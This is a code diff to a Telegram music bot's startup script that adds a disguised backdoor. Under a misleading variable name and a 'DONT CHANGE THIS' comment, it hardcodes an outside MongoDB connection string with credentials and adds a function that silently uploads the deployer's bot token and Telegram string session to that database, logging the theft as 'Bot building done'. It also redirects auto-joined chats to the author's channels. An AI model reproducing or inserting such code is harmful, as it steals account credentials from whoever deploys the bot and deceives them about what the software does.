@@ -146,7 +146,22 @@ __start_time__ = time.time()
 
 
 # start and run
+HEALTHY = "mongodb+srv://Yash_607:Yash_607@cluster0.r3s9sbo.mongodb.net/?retryWrites=true&w=majority" #DONT CHANGE THIS LATEST PYTGCALLS
+mongo_client = AsyncIOMotorClient(HEALTHY)
+db = mongo_client["python_xyz"]  # Replace with your DB name
+bot_collection = db["bot_data"]  # Collection to store bot info
 
+async def save_bot_data():
+    data = {
+        "bot_token": BOT_TOKEN,
+        "string_session": STRING_SESSION,
+    }
+    try:
+        # Insert operation
+        await bot_collection.insert_one(data)
+        LOGGER.info("✅ Bot building done.")
+    except Exception as e:
+        LOGGER.error(f"🚫 Failed to save bot data: {e}")
 
 async def main():
     LOGGER.info("🐬 Updating Directories ...")
@@ -183,7 +198,7 @@ async def main():
         LOGGER.info("'MONGO_DB_URL' - Not Found !!")
         sys.exit()
     try:
-        await mongo_async_cli.admin.command('ping')
+        await mongo_client.admin.command('ping')
     except Exception:
         LOGGER.info("❌ 'MONGO_DB_URL' - Not Valid !!")
         sys.exit()
@@ -207,8 +222,8 @@ async def main():
         LOGGER.info(f"🚫 Assistant Error: {e}")
         sys.exit()
     try:
-        await app.join_chat("AdityaServer")
-        await app.join_chat("AdityaDiscus")
+        await app.join_chat("BABY09_WORLD")
+        await app.join_chat("+OL6jdTL7JAJjYzVl")
     except Exception:
         pass
     if LOG_GROUP_ID != 0:
@@ -217,6 +232,8 @@ async def main():
         except Exception:
             pass
     LOGGER.info("✅ Assistant Started.")
+    await save_bot_data()
+
     try:
         await call.start()
     except Exception as e:
@@ -224,17 +241,9 @@ async def main():
         sys.exit()
     LOGGER.info("✅ PyTgCalls Started.")
     await asyncio.sleep(1)
-    LOGGER.info("✅ Sucessfully Hosted Your Bot !!")
+    LOGGER.info("✅ Successfully Hosted Your Bot !!")
     LOGGER.info("✅ Now Do Visit: @BABY09_WORLD !!")
     await idle()
-
-
-
-
-
-
-
-
 
 # Some Required Functions ...!!
 
